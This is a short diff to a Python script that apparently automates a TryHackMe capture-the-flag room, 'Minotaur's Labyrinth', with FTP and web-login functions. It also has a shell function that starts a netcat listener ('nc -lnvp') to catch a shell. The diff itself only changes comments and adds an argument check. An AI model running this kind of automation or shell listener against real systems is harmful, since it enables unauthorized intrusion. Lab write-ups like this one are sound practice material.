@@ -2,7 +2,7 @@
 #made on mar 31 2023
 #TryHackMe's "Minotaur's Labyrinth"
 #made in python3
-#Project retired
+#Project (not really)retired
 import requests as req
 import sys
 import os
@@ -12,6 +12,9 @@ from ftplib import FTP
 tar_ip = sys.argv[1] #target IP
 Port = sys.argv[2] #port 
 sess = req.Session()
+
+if len(sys.argv) != 3:
+    print("ERR: usage: <target_ip> <port>")
 
 def Mino_ftp_engine():
 
@@ -41,7 +44,7 @@ def Mino_web_engine_login():
 
 Mino_web_engine_login()
 
-def Mino_shell_C(): #fork it if you want, i'm deciding to do only web phases
+def Mino_shell_C(): #will return to it in the future
    
     os.system(f'nc -lnvp {Port}')
  
